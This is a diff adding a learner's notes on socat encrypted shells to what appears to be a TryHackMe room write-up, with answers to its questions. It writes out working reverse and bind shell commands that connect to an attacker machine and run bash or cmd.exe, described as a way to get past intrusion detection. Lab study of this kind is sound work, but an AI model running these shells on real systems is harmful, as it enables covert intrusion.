@@ -99,6 +99,39 @@ Answer:TCP-L:8080
 
 7.Socat Encrypted Shells
 
+Created to often bypass IDS (Intrusion Detection Systems) 
+
+Creating a cert on our attacking machine, then we can use it for the encrypted shell.
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+
+Merge our 2 files into a single .pem file
+cat shell.key shell.crt > shell.pem
+
+Now we setup our listener
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+
+This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly 
+signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.
+
+Connecting 
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+
+For bind shell:
+
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+
+Attacker:
+
+socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
+
+Used hint to get to know its FILE:"tty",raw,echo=0
+Answer:socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
+
+Okay had to google the second answer link is below
+https://medium.com/@zycc2727/tryhackme-what-the-shell-61b54eda78e6
+Answer:socat OPENSSL:10.10.10.5:53,verify=0 EXEC:”bash -li”,pty,stderr,sigint,setsid,sane
+
+I have to look again over this topic since i dont understand 100% whats happening here.
 
 8.Common Shell Payloads
 
